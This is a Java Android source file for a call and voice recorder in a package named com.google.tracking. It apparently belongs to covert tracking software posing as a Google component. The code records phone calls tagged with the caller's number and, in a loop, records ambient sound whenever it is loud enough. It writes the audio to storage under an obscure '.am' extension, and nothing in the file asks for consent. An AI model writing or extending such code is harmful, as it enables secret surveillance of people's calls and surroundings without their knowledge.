package com.google.tracking.call;

import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import com.google.tracking.constants.TrackingConstants;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class CallRecorderController {
    private static String TAG = "CallRecorderController";
    private static String log_tag = "CallReceiver";
    //settings
    private String save_folder;
    private String date_format;

    private MediaRecorder recorder;
    private boolean _isRecordind = false;
    private boolean _isCallRecord = false;
    File audiofile;

    public CallRecorderController() {
        save_folder = TrackingConstants.FILES_PATH;
        date_format = "yy.MM.dd_HH.mm.ss";
    }

    public String currentFileName(){
        if (audiofile == null) return "";
        return audiofile.getName();
    }

    public boolean isRecordind() {
        return _isRecordind;
    }

    public boolean isCallRecord() {
        return _isCallRecord;
    }

    public void stopRecordCall() {
        if (_isRecordind) {
            recorder.stop();
        }
        _isRecordind = false;
        _isCallRecord = false;
    }

    private void stopRecordVoice() {
        if (_isRecordind && !_isCallRecord) {
            recorder.stop();
        }
        _isRecordind = false;
        _isCallRecord = false;
    }

    //called in a infinite loop
    public void recordVoice() {
        if (_isRecordind && _isCallRecord) {
            return;
        }
        else if(_isRecordind && !_isCallRecord){
            int amp = recorder.getMaxAmplitude();

            Log.d(TAG, "sound amplitude:" + String.valueOf(amp));

            if(amp!=0 && amp < TrackingConstants.MIN_AMPLITUDE_TO_RECORD_VOICE){
                stopRecordVoice();
            }
        }
        else {
            _isRecordind = true;
            _isCallRecord = false;
            writeCall("voice");
        }
    }

    public void recordCall(String phoneNumber) {
        if (_isRecordind && !_isCallRecord) {
//            throw new Error("Trying to start new recordCall while previous not stopped");
            stopRecordCall();
        } else if (_isRecordind && _isCallRecord) {
            return;
        }

        _isRecordind = true;
        _isCallRecord = true;

        writeCall(phoneNumber);
    }

    private void writeCall(String phoneNumber) {
        File sampleDir = new File(Environment.getExternalStorageDirectory(), save_folder);
        if (!sampleDir.exists()) {
            sampleDir.mkdirs();
        }

        phoneNumber = phoneNumber.replace("+375", "");
        String time_stamp = new SimpleDateFormat(date_format).format(new Date());
        String file_name = time_stamp + "_n_";
        file_name += (phoneNumber != null) ? (phoneNumber + "_") : "unknown_phone_number_";


        try {
            audiofile = File.createTempFile(file_name, ".am", sampleDir);
        } catch (IOException e) {
            e.printStackTrace();
        }
        String path = Environment.getExternalStorageDirectory().getAbsolutePath();

        recorder = new MediaRecorder();
//                          recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);

        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(audiofile.getAbsolutePath());
//            recorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM/aud.amr");
        try {
            recorder.prepare();
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        recorder.start();
    }
}
